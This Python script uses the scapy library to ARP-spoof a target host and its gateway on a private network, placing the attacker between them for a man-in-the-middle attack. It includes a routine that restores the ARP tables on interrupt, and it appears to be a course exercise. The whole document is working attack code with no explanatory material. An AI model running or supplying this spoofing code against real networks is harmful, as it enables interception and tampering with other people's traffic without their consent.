#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    ans_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return ans_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,  pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"

try:
    pckt_sent = 0
    while pckt_sent < 6:
        pckt_sent = pckt_sent+2
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print("\r[+] Sent " + str(pckt_sent) + " packets", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] CTRL+ C detected, reversing changes\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)